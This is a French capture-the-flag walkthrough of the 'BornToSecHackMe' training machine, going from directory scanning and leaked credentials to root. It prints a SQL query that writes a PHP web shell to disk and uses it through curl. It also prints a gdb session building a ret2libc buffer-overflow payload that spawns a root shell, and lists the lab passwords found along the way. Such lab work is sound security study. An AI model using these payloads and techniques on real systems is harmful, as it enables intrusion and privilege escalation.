Utilisation de dirbuster pour scan le site et trouver des dossiers


# Forum

url: `https://192.168.1.25/forum/index.php?id=6`
```
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

user: `lmezard`
password: `!q\]Ej?*5K5cy*AJ`

Connection pour le forum
Dans les parametres on a l'adresse mail: `laurie@borntosec.net`

# Webmail
url: `https://192.168.1.25/webmail/src/webmail.php`
user: `laurie@borntosec.net`
password: `!q\]Ej?*5K5cy*AJ`

Un des mail donne l'acces a la base de donnees:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

# PHPMyAdmin

url: `https://192.168.1.25/phpmyadmin`
user: `root`
password: `Fg-'kKXBj87E:aJ$`

## Inclusion SQL

```
SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/forum/templates_c/dd.php"
```

On peut maintenant lancer des commandes avec curl:
`curl -k https://192.168.1.25/forum/templates_c/dd.php?c=<command>`

L'option k permet de ne pas verifier le certificat.

Pour les espaces on utilise %20

Dans home on peut seulement acceder a LOOKATME

A l'interieur on a un fichier password:
`lmezard:G!@M6f4Eatau{sF"`

C'est identifiant correspondent a ceux du serveur ftp

# FTP

connection: `ftp <ip>`
user: `lmezard`
password: `G!@M6f4Eatau{sF"`


En lancant la commande `ls` on trouve deux fichier: README et fun

On utilise get pour recuperer les deux fichiers



# fun

Le fichier README nous indique qu'une fois la solution trouve on aura le mot de passe pour laurie pour la connection ssh

En lancant la commande `file` sur le fichier fun on trouve que c'est une archive tar:

```
fun: POSIX tar archive (GNU)
```

`tar -xf fun`

Une fois cette commande faite, on peut trouver un dossier contenant beaucoup de fichier.


`grep "main" *`

BJPCP.pcap


```
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```
En utilisant: `grep "" *`

getme1() -> 331ZU.pcap -> file5 donc file6 -> APM1E.pcap -> `I`
getme2() -> G7Y8I.pcap -> file37 donc file38 -> ZPY1Q.pcap -> `h`
getme3() -> B62N4.pcap -> file56 donc file57 -> ECOW1.pcap -> `e`
getme4() -> 0T16C.pcap -> file115 donc 116 -> 7DT5Q.pcap -> `a`
getme5() -> 4KAOH.pcap -> file368 donc file369 -> T7VV0.pcap -> `r`
getme6() -> 91CD0.pcap -> file521 donc file522 -> J5LKW.pcap -> `t`
getme7() -> 32O0M.pcap -> file736 donc file737 -> T44J5.pcap -> `p`
getme8() -> `w`
getme9() -> `n`
getme10() -> `a`
getme11() -> `g`
getme12() -> `e`


Resultat: `Iheartpwnage`

On le chiffre maintenant en sha-256: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

On arrive bien a se connecter en ssh avec laurie.


# ssh

## laurie
user: `laurie`
password: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`


On trouve dans son repertoire deux fichiers: README et bomb.

On les telecharge avec scp

On verifie l'historique mais on ne trouve rien.

Le readme nous donne comme defi de trouver le mot de passe de thor

On voit en utilisant `nm` que le programme appel system et getenv. Il utilise aussi les sockets.


On utilise gdb sur bomb pour pouvoir le dessassembler
`gdb ./bomb`
`disassemble main`

on voit que le programme separe les phases: phase_{1..6}

Pour la premiere phase il suffit de lire la variable. Pour les suivante on a du comprendre comment fonctionnait chaque phase pour ensuite les dechiffrer en creant des scripts qui sont dans les sources.

Password: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## thor

user: `thor`
password: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

On a code un script python qui permet d'afficher le turtle qui ecrit : SLASH

MD5 -> 646da671ca01bb5d84dbb5fb2238dc8e

## zaz

user: `zaz`
password: `646da671ca01bb5d84dbb5fb2238dc8e`

```
(gdb) r `python -c 'print "A" * 140'`
Starting program: /home/zaz/exploit_me `python -c 'print "A" * 140'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Address system: `0xb7e6b060`

```
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>

```

Address exit: `0xb7e5ebe0`

```
(gdb) info proc mappings
process 1844
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fda000 0xb7fdd000     0x3000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0x8048000 to 0xc0000000, "/bin"
A syntax error in expression, near `to 0xc0000000, "/bin"'.
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.

```
Address /bin/sh: `0xb7f8cc58`

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'`

id
cd /root
cat README
```

Tu as les droits root !
